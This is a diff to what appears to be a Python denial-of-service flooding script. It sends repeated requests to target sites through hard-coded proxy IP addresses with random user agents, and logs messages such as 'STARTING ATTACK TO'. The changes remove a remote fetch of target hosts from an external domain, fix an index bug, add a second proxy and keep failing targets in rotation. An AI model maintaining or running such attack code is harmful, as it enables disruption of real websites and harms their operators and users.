@@ -15,12 +15,6 @@ from urllib3 import disable_warnings
 from pyuseragents import random as random_useragent
 from json import loads
 
-try:
-    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
-except:
-    sleep(5)
-    HOSTS = loads(requests.get("http://rockstarbloggers.ru/hosts.json").content)
-
 disable_warnings()
 logger.remove()
 logger.add(stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
@@ -115,7 +109,7 @@ def mainth():
         scraper = base_scraper()
         logger.info("GET RESOURCES FOR ATTACK")
         # data = choice(sites)
-        index_ = randint(0, len(sites))
+        index_ = randint(0, len(sites) - 1)
         data = sites[index_]
 
         if current_target is None:
@@ -124,10 +118,14 @@ def mainth():
         if current_target.startswith('http') is False:
             current_target = "https://" + current_target
 
-        ip = '193.23.50.206'
-        proxy_str = (ip + ":11335")
-        scraper.proxies.update({'http': "http://" + proxy_str,
-                                'https': "http://" + proxy_str})
+        proxies = [
+            'http://193.23.50.206:11335',
+            'http://193.23.50.164:10215'
+            # 'http://193.23.50.164:10216'
+        ]
+        cur_proxy = choice(proxies)
+        scraper.proxies.update({'http': cur_proxy,
+                                'https': cur_proxy})
 
         logger.info("STARTING ATTACK TO " + current_target)
         for _ in range(MAX_REQUESTS):
@@ -142,7 +140,7 @@ def mainth():
                             str(response.status_code) + " " + data)
             except Exception as err:
                 logger.warning("GOT ISSUE WHILE ATTACKING " + data)
-                sites.pop(index_)
+                # sites.pop(index_)
 
 
 def cleaner():
